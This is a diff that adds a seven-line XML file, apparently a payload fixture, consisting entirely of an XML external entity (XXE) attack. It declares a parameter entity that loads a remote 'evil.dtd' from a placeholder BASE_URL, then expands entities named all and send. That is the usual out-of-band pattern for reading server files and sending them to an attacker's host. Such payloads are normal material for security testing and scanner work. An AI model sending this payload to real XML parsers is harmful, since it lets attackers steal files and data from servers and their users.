@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<!DOCTYPE ANY[
+<!ENTITY % remote SYSTEM "BASE_URL/evil.dtd">
+%remote;
+%all;
+]>
+<root>&send;</root>
